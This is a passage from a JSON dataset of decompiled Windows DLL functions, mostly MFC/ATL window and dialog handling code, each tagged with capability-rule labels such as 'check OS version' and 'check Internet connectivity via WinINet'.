iVar9 = *(puVar14 + 4);\n                    for (; (puVar15 = NULL,  iVar9 != 0 &&\n                           (((*puVar14 != uVar5 || (puVar14[1] != 0)) || (puVar15 = puVar14,  puVar14[2] != 0))));\n                        puVar14 = puVar14 + 8) {\n                        iVar9 = *(puVar14 + 0xc);\n                    }\n                    if (puVar15 != NULL) {\n                        *(uVar12 * 0x18 + 0x180069c28) = puVar15;\n                        int.18001cb10(7);\n                        goto code_r0x00018001a4d2;\n                    }\n                }\n                else {\n                    puVar14 = ppcVar7[1];\n                    while( true ) {\n                        iVar9 = *(puVar14 + 4);\n                        for (; (puVar15 = NULL,  iVar9 != 0 &&\n                               (((*puVar14 != 0xc000 || (puVar14[1] != 0)) || (puVar15 = puVar14,  puVar14[2] != 0))));\n                            puVar14 = puVar14 + 8) {\n                            iVar9 = *(puVar14 + 0xc);\n                        }\n                        if (puVar15 == NULL) break;\n                        if (**(puVar15 + 4) == uVar5) {\n                            *(uVar12 * 0x18 + 0x180069c28) = puVar15;\n                            int.18001cb10(7);\n                            goto code_r0x00018001afca;\n                        }\n                        puVar14 = puVar15 + 8;\n                    }\n                }\n                ppcVar7 = (*pcVar2)();\n                pcVar2 = *ppcVar7;\n            } while( true );\n        }\n        puVar15 = *(uVar12 * 0x18 + 0x180069c28);\n        int.18001cb10(7);\n        if (puVar15 == NULL) {\n            return 0;\n        }\n        if (uVar5 < 0xc000) {\ncode_r0x00018001a4d2:\n            uStack248 = 0x7fffffff;\n            pcVar2 = *(puVar15 + 6);\n            uVar12 = *(puVar15 + 4);\n            iVar3 = arg4 >> 0x10;\n            if (uVar12 < 0x25) {\n                if (uVar12 == 0x24) {\n                    uVar6 = fcn.180017c38(arg4);\n                    (*pcVar2)(arg1, uVar6);\n                }\n                else if (uVar12 < 0x13) {\n                    if (uVar12 == 0x12) {\n                        (*pcVar2)(arg1, arg3, arg4);\n                    }\n                    else if (uVar12 < 10) {\n                        if (uVar12 == 9) {\n                            fcn.180012810(auStack240);\n                            iStack232 = arg4[1];\n                            uStack264 = (*pcVar2)(arg1, auStack240, *(arg4 + 2));\n                            iStack232 = 0;\n                            fcn.180012ff8(auStack240);\n                        }\n                        else if (uVar12 == 1) {\n                            uVar6 = fcn.180012f38(arg3);\n                            iVar4 = (*pcVar2)(arg1, uVar6);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 2) {\n                            iVar4 = (*pcVar2)(arg1, arg3 & 0xffffffff);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 3) {\n                            iVar4 = (*pcVar2)(arg1, arg3 & 0xffffffff);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 4) {\n                            iVar4 = (*pcVar2)(arg1, arg3);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 5) {\n                            uVar6 = fcn.180017c38(arg3);\n                            iVar4 = (*pcVar2)(arg1, uVar6, arg4 & 0xffff, arg4 >> 0x10 & 0xffff);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 6) {\n                            uVar6 = fcn.180017c38(arg3);\n                            iVar4 = (*pcVar2)(arg1, uVar6, arg4);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 7) {\n                            iVar4 = (*pcVar2)(arg1, arg4);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 8) {\n                            fcn.180012810(auStack240);\n                            iStack232 = arg4[1];\n                            fcn.180015f5c(auStack200);\n                            iStack136 = *arg4;\n                            uVar1 = *(arg4 + 2);\n                            puVar8 = fcn.180017c7c(iStack136);\n                            if (puVar8 == NULL) {\n                                if ((arg1[0x13] != 0) &&\n                                   (iVar9 = fcn.18002d110(arg1[0x13] + 0x48, iStack136),  iVar9 != 0)) {\n                                    iStack40 = iVar9;\n                                }\n                                puVar8 = auStack200;\n                            }\n                            uStack264 = (*pcVar2)(arg1, auStack240, puVar8, uVar1);\n                            iStack232 = 0;\n                            iStack136 = 0;\n                            fcn.1800187d8(auStack200);\n                            fcn.180012ff8(auStack240);\n                        }\n                    }\n                    else if (uVar12 == 10) {\n                        uVar6 = fcn.180017c38(arg4);\n                        iVar4 = (*pcVar2)(arg1, arg3 & 0xffff, uVar6, arg3 >> 0x10 & 0xffff);\n                        uStack264 = iVar4;\n                    }\n                    else if (uVar12 == 0xb) {\n                        iVar4 = (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff);\n                        uStack264 = iVar4;\n                    }\n                    else if (uVar12 == 0xc) {\n                        uVar6 = fcn.180017c38(arg3);\n                        iVar4 = (*pcVar2)(arg1, uVar6, arg4 & 0xffff, arg4 >> 0x10 & 0xffff);\n                        uStack264 = iVar4;\n                    }\n                    else if (uVar12 == 0xd) {\n                        iVar4 = (*pcVar2)(arg1, arg4);\n                        uStack264 = iVar4;\n                    }\n                    else if (uVar12 == 0xe) {\n                        uStack264 = (*pcVar2)(arg1, arg3, arg4);\n                    }\n                    else if (uVar12 == 0xf) {\n                        uVar6 = fcn.1800143e0(arg4);\n                        uStack264 = (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff, uVar6);\n                    }\n                    else if (uVar12 == 0x10) {\n                        (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                    }\n                    else if (uVar12 == 0x11) {\n                        (*pcVar2)(arg1, arg3);\n                    }\n                }\n                else if (uVar12 < 0x1c) {\n                    if (uVar12 == 0x1b) {\n                        iVar4 = (*pcVar2)(arg1, arg3 & 0xffffffff);\n                        uStack264 = iVar4;\n                    }\n                    else if (uVar12 == 0x13) {\n                        (*pcVar2)(arg1);\n                    }\n                    else if (uVar12 == 0x14) {\n                        (*pcVar2)(arg1, arg3 & 0xffffffff);\n                    }\n                    else if (uVar12 == 0x15) {\n                        (*pcVar2)(arg1, arg3 & 0xffffffff, arg4 & 0xffffffff);\n                    }\n                    else if (uVar12 == 0x16) {\n                        (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff);\n                    }\n                    else if (uVar12 == 0x17) {\n                        (*pcVar2)(arg1, iVar13, iVar3);\n                    }\n                    else if (uVar12 == 0x18) {\n                        (*pcVar2)(arg1, arg3 & 0xffffffff, arg4 & 0xffff, arg4 >> 0x10 & 0xffff);\n                    }\n                    else if (uVar12 == 0x19) {\n                        (*pcVar2)(arg1, arg3 & 0xffffffff, arg4 & 0xffff, arg4 >> 0x10 & 0xffff);\n                    }\n                    else if (uVar12 == 0x1a) {\n                        uVar6 = fcn.180017c38(arg4);\n                        (*pcVar2)(arg1, arg3 & 0xffffffff, uVar6);\n                    }\n                }\n                else if (uVar12 == 0x1c) {\n                    uVar5 = (*pcVar2)(arg1, arg3 & 0xffffffff);\n                    uStack264 = uVar5;\n                }\n                else if (uVar12 == 0x1d) {\n                    iVar4 = (*pcVar2)(arg1);\n                    uStack264 = iVar4;\n                }\n                else if (uVar12 == 0x1e) {\n                    (*pcVar2)(arg1, arg3, arg4);\n                }\n                else if (uVar12 == 0x1f) {\n                    uVar6 = fcn.180017c38(arg3);\n                    uVar10 = fcn.180017c38(arg4);\n                    (*pcVar2)(arg1, arg1[8] == arg4, uVar10, uVar6);\n                }\n                else if (uVar12 == 0x20) {\n                    uVar6 = fcn.180012f38(arg3);\n                    (*pcVar2)(arg1, uVar6);\n                }\n                else if (uVar12 == 0x21) {\n                    uVar6 = fcn.1800143e0(arg3);\n                    (*pcVar2)(arg1, uVar6);\n                }\n                else if (uVar12 == 0x22) {\n                    uVar6 = fcn.1800143e0(arg3);\n                    (*pcVar2)(arg1, uVar6, iVar13, iVar3);\n                }\n                else if (uVar12 == 0x23) {\n                    uVar6 = fcn.180017c38(arg3);\n                    (*pcVar2)(arg1, uVar6);\n                }\n            }\n            else if (uVar12 < 0x38) {\n                if (uVar12 == 0x37) {\n                    iStack256 = iVar13;\n                    iStack252 = iVar3;\n                    iVar4 = (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10, CONCAT44(iStack252, iStack256));\n                    uStack264 = iVar4;\n                    if (uStack264 == 0) {\n                        return 0;\n                    }\n                }\n                else if (uVar12 < 0x2f) {\n                    if (uVar12 == 0x2e) {\n                        (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                        uStack264 = 1;\n                    }\n                    else if (uVar12 == 0x25) {\n                        uVar6 = fcn.180017c38(arg3);\n                        (*pcVar2)(arg1, uVar6, arg4 & 0xffff, arg4 >> 0x10 & 0xffff);\n                    }\n                    else if (uVar12 == 0x26) {\n                        iStack256 = iVar13;\n                        iStack252 = iVar3;\n                        uVar6 = fcn.180017c38(arg3);\n                        (*pcVar2)(arg1, uVar6, CONCAT44(iStack252, iStack256));\n                    }\n                    else if (uVar12 == 0x27) {\n                        uVar6 = fcn.180017c38(arg3);\n                        (*pcVar2)(arg1, uVar6, arg4);\n                    }\n                    else if (uVar12 == 0x28) {\n                        uStack264 = (*pcVar2)(arg1);\n                    }\n                    else if (uVar12 == 0x29) {\n                        uVar6 = fcn.180017c38(arg4);\n                        (*pcVar2)(arg1, arg3 & 0xffff, uVar6, arg3 >> 0x10 & 0xffff);\n                    }\n                    else if (0x29 < uVar12) {\n                        if (uVar12 < 0x2c) {\n                            iVar4 = arg3 >> 0x10;\n                            if (uVar12 == 0x2a) {\n                                uVar6 = fcn.180017c38(arg4);\n                                (*pcVar2)(arg1, arg3, iVar4, uVar6);\n                            }\n                            else {\n                                (*pcVar2)(arg1, arg3, iVar4);\n                            }\n                        }\n                        else if (uVar12 == 0x2c) {\n                            (*pcVar2)(arg1, arg4);\n                        }\n                        else if (uVar12 == 0x2d) {\n                            (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                        }\n                    }\n                }\n                else if (uVar12 == 0x2f) {\n                    iVar4 = (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                    uStack264 = iVar4;\n                }\n                else if (uVar12 == 0x30) {\n                    iStack256 = iVar13;\n                    iStack252 = iVar3;\n                    uVar5 = (*pcVar2)(arg1, CONCAT44(iStack252, iStack256));\n                    uStack264 = uVar5;\n                }\n                else if (uVar12 == 0x31) {\n                    uVar5 = (*pcVar2)(arg1);\n                    uStack264 = uVar5;\n                }\n                else if (uVar12 == 0x32) {\n                    (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                }\n                else if (uVar12 == 0x33) {\n                    (*pcVar2)(arg1, arg4);\n                }\n                else if (uVar12 == 0x34) {\n                    (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff, arg4);\n                }\n                else if (uVar12 == 0x35) {\n                    iStack256 = iVar13;\n                    iStack252 = iVar3;\n                    (*pcVar2)(arg1, arg3 & 0xffffffff, CONCAT44(iStack252, iStack256));\n                }\n                else if (uVar12 == 0x36) {\n                    (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                    uStack264 = 1;\n                }\n            }\n            else if (uVar12 < 0x4d) {\n                if (uVar12 == 0x4c) {\n                    (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                }\n                else if (uVar12 == 0x38) {\n                    iStack256 = iVar13;\n                    iStack252 = iVar3;\n                    (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10, CONCAT44(iStack252, iStack256));\n                }\n                else if (uVar12 == 0x45) {\n                    uStack264 = (*pcVar2)(arg1);\n                    if (uStack264 != 0) {\n                        return 0;\n                    }\n                }\n                else if (uVar12 == 0x46) {\n                    iStack256 = iVar13;\n                    iStack252 = iVar3;\n                    uStack264 = (*pcVar2)(arg1, CONCAT44(iStack252, iStack256));\n                }\n                else if (uVar12 == 0x47) {\n                    uVar6 = fcn.180017c38(arg3);\n                    uVar5 = (*pcVar2)(arg1, uVar6, arg4 & 0xffffffff);\n                    uStack264 = uVar5;\n                }\n                else if (uVar12 == 0x48) {\n                    uVar6 = fcn.1800143e0(arg4);\n                    (*pcVar2)(arg1, arg3 & 0xffffffff, uVar6);\n                }\n                else if (uVar12 == 0x49) {\n                    uVar6 = fcn.1800143e0(arg4);\n                    uVar5 = (*pcVar2)(arg1, arg3 & 0xffffffff, uVar6);\n                    uStack264 = uVar5;\n                }\n                else if (uVar12 == 0x4a) {\n                    uVar5 = (*pcVar2)(arg1, arg4);\n                    uStack264 = uVar5;\n                }\n                else if (uVar12 == 0x4b) {\n                    uVar6 = fcn.1800143e0(arg3);\n                    (*pcVar2)(arg1, uVar6, arg4 & 0xffffffff);\n                }\n            }\n            else if (uVar12 == 0x4d) {\n                uVar5 = arg4 >> 0x10;\n                uVar6 = fcn.180017c38(arg3);\n                (*pcVar2)(arg1, uVar6, uVar5 & 0xfff, uVar5 & 0xf000, \n                          in_stack_fffffffffffffee8 & 0xffffffff00000000 | arg4 & 0xffff);\n                uStack264 = 1;\n            }\n            else if (uVar12 == 0x4e) {\n                (*pcVar2)(arg1, arg3 & 0xff, arg4);\n            }\n            else if (uVar12 == 0x4f) {\n                uVar5 = (*pcVar2)(arg1, arg3 & 0xffffffff, arg4 & 0xffffffff);\n                uStack264 = uVar5;\n            }\n            else if (uVar12 == 0x50) {\n                iStack256 = iVar13;\n                iStack252 = iVar3;\n                (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff, CONCAT44(iStack252, iStack256));\n                uStack264 = 1;\n            }\n            else if (uVar12 == 0x51) {\n                iStack256 = iVar13;\n                iStack252 = iVar3;\n                (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff, CONCAT44(iStack252, iStack256));\n                uStack264 = 1;\n            }\n            else if (uVar12 == 0x52) {\n                (*pcVar2)(arg1, uVar11 & 0xffffffffffffff00 | arg3 & 0xff, arg4 & 0xffffffff);\n                uStack264 = 1;\n            }\n            else if (uVar12 == 0x53) {\n                (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n            }\n            else if (uVar12 == 0x54) {\n                (*pcVar2)(arg1, arg3 & 0xffff);\n            }\n        }\n        else {\ncode_r0x00018001afca:\n            uStack248 = 0x7fffffff;\n            uStack264 = (**(puVar15 + 6))(arg1, arg3, arg4);\n        }\n    }\ncode_r0x00018001afdf:\n    if (in_stack_00000028 != NULL) {\n        *in_stack_00000028 = uStack264;\n    }\n    return 1;\n}\n",
        "token_count": 5541
    },
    "18001bc8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.18001bc84(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 0x98) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = (**(**(arg1 + 0x98) + 0x130))();\n    }\n    return uVar1;\n}\n",
        "token_count": 84
    },
    "18001bca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001bcac(int64_t hDlg, ulong nIDDlgItem)\n\n{\n    ulong arg1;\n    \n    if (*(hDlg + 0x98) == 0) {\n        arg1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(hDlg + 0x40));\n        fcn.180017c38(arg1);\n    }\n    else {\n        (**(**(hDlg + 0x98) + 0xe8))();\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "18001bd2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001bd28(int64_t hWnd)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongW)(*(hWnd + 0x40), 0xfffffff0);\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0xf0))();\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "18001bd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001bd5c(int64_t hWnd)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongW)(*(hWnd + 0x40), 0xffffffec);\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0xf8))();\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "18001bd9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001bd90(int64_t hWnd, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (hWnd == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(hWnd + 0x40));\n    if (iVar2 == 0) {\n        if (*(hWnd + 0xa0) == 0) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    else if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_SetWindowTextW)(*(hWnd + 0x40), arg2);\n        return;\n    }\n    (**(**(hWnd + 0xa0) + 0x110))(*(hWnd + 0xa0), arg2);\n    return;\n}\n",
        "token_count": 233
    },
    "18001be0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001be00(int64_t hWnd)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(hWnd + 0x40));\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x120))();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "18001be3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001be30(int64_t hWnd, ulong X, ulong Y, ulong nWidth)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_MoveWindow)(*(hWnd + 0x40));\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x130))();\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "18001be7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001be78(int64_t hWnd, ulong nCmdShow)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(*(hWnd + 0x40));\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x140))();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "18001bea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001bea8(int64_t hWnd)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_IsWindowEnabled)(*(hWnd + 0x40));\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x148))();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "18001bed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001bed8(int64_t hWnd, ulong bEnable)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(*(hWnd + 0x40));\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x150))();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "18001bf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001bf08(int64_t hWnd)\n\n{\n    ulong arg1;\n    \n    if (*(hWnd + 0xa0) == 0) {\n        arg1 = (*_sym.imp.USER32.dll_SetFocus)(*(hWnd + 0x40));\n        fcn.180017c38(arg1);\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x160))();\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "18001bf7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001bf7c(int64_t arg1, ulong noname_1, ulong noname_2, ulong arg4)\n\n{\n    if (*(arg1 + 0xa0) != 0) {\n        fcn.18001bf40(arg1);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "18001bfa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001bfac(ulong *arg1)\n\n{\n    if (arg1[1] == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongW)(*arg1, 0xfffffff0);\n    }\n    else {\n        (**(*arg1[1] + 0xf0))();\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "18001c0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001c0b8(int64_t hWnd, int64_t arg2)\n\n{\n    ulong arg2_00;\n    int64_t iVar1;\n    \n    if ((hWnd != 0) && (*(hWnd + 0xa0) == 0)) {\n        arg2_00 = (*_sym.imp.USER32.dll_GetParent)(*(hWnd + 0x40));\n        iVar1 = fcn.18002d110(arg2 + 0x30, arg2_00);\n        if ((iVar1 != 0) && (*(iVar1 + 0x98) != 0)) {\n            (**(**(iVar1 + 0x98) + 0x138))(*(iVar1 + 0x98), hWnd, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "18001c14": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t * fcn.18001c144(int64_t arg1, int64_t *arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *arg1_00;\n    uint32_t uVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    int64_t **ppiVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    code *pcVar8;\n    code *pcVar9;\n    bool bVar10;\n    int64_t iStackX8;\n    \n    if (*(arg1 + 0x98) != 0) {\n        if ((*(arg1 + 0x78) >> 0xb & 1) == 0) {\n            uVar3 = *(arg1 + 0x40);\n            uVar7 = 5;\n            while( true ) {\n                uVar3 = (*_sym.imp.USER32.dll_GetWindow)(uVar3, uVar7);\n                iVar4 = fcn.180017c38(uVar3);\n                if (iVar4 == 0) break;\n                uVar2 = fcn.18001bd5c(iVar4);\n                if ((((uVar2 >> 0x10 & 1) != 0) && (uVar2 = fcn.18001bd28(iVar4),  (uVar2 >> 0x1c & 1) != 0)) &&\n                   (uVar2 = fcn.18001bd28(iVar4),  (uVar2 >> 0x1b & 1) == 0)) {\n                    return NULL;\n                }\n                uVar3 = *(iVar4 + 0x40);\n                uVar7 = 2;\n            }\n        }\n        if (arg3 == 0) {\n            pcVar9 = 0x18000fd04;\n            pcVar8 = method.ATL::CFixedStringMgr.virtual_32;\n        }\n        else {\n            pcVar9 = 0x18001c120;\n            pcVar8 = method.ATL::CFixedStringMgr.virtual_24;\n        }\n        iStackX8 = (*pcVar8)(*(arg1 + 0x98) + 0x80);\ncode_r0x00018001c20c:\n        do {\n            if (iStackX8 == 0) {\n                return NULL;\n            }\n            ppiVar5 = (*pcVar9)(*(arg1 + 0x98) + 0x80, &iStackX8);\n            piVar1 = *ppiVar5;\n            if (arg2 == NULL) {\n                if (piVar1[1] == 0) {\n                    iVar4 = *piVar1;\n                }\n                else {\n                    iVar4 = *(piVar1[1] + 0x48);\n                }\n                if ((iVar4 != 0) && (iVar6 = (*_sym.imp.USER32.dll_GetFocus)(),  iVar4 == iVar6)) break;\n                if (piVar1[1] == 0) goto code_r0x00018001c20c;\n                bVar10 = piVar1[1] == *(*(arg1 + 0x98) + 0xd8);\n            }\n            else {\n                bVar10 = arg2 == piVar1;\n            }\n        } while (!bVar10);\n        if (piVar1 != NULL) {\n            while( true ) {\n                if (iStackX8 == 0) {\n                    iStackX8 = (*pcVar8)(*(arg1 + 0x98) + 0x80);\n                }\n                ppiVar5 = (*pcVar9)(*(arg1 + 0x98) + 0x80, &iStackX8);\n                arg1_00 = *ppiVar5;\n                uVar2 = fcn.18001bfac(arg1_00);\n                if (arg1_00 == piVar1) break;\n                if ((((uVar2 >> 0x10 & 1) != 0) && ((uVar2 >> 0x1b & 1) == 0)) && ((uVar2 >> 0x1c & 1) != 0)) {\n                    return arg1_00;\n                }\n            }\n            return arg1_00;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 946
    },
    "18001c2e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001c2e8(int64_t arg1, ulong *arg2)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    ulong *puVar5;\n    ulong uVar6;\n    ulong *puVar7;\n    int64_t iVar8;\n    ulong *arg1_00;\n    \n    if (*(arg1 + 0x98) == 0) {\n        return;\n    }\n    if (arg2 == NULL) {\n        return;\n    }\n    if ((*(arg2 + 2) != 0) && (iVar8 = (*_sym.imp.USER32.dll_SendMessageW)(*arg2, 0xf0, 0, 0),  iVar8 == 1)) {\n        uVar6 = *arg2;\ncode_r0x00018001c3a0:\n        (*_sym.imp.USER32.dll_SendMessageW)(uVar6, 0xf1, 0, 0);\n        return;\n    }\n    puVar5 = fcn.18002d67c(*(arg1 + 0x98) + 0x80, arg2, 0);\n    if (puVar5 == NULL) {\n        fcn.180012514();\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    puVar7 = *puVar5;\ncode_r0x00018001c360:\n    if (puVar7 == NULL) {\ncode_r0x00018001c3b3:\n        iVar8 = puVar5[1];\n        while( true ) {\n            if (iVar8 == 0) {\n                return;\n            }\n            iVar2 = *(iVar8 + 8);\n            arg1_00 = *(iVar8 + 0x10);\n            if ((*(arg1_00 + 2) != 0) &&\n               (iVar8 = (*_sym.imp.USER32.dll_SendMessageW)(*arg1_00, 0xf0, 0, 0),  iVar8 == 1)) break;\n            uVar4 = fcn.18001bfac(arg1_00);\n            iVar8 = iVar2;\n            if ((uVar4 >> 0x11 & 1) != 0) {\n                return;\n            }\n        }\n    }\n    else {\n        puVar1 = *puVar7;\n        arg1_00 = puVar7[2];\n        uVar4 = fcn.18001bfac(arg1_00);\n        if ((uVar4 >> 0x11 & 1) != 0) goto code_r0x00018001c3b3;\n        puVar7 = puVar1;\n        if ((*(arg1_00 + 2) == 0) || (iVar8 = (*_sym.imp.USER32.dll_SendMessageW)(*arg1_00, 0xf0),  iVar8 != 1))\n        goto code_r0x00018001c360;\n    }\n    uVar6 = *arg1_00;\n    goto code_r0x00018001c3a0;\n}\n",
        "token_count": 683
    },
    "18001c57": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
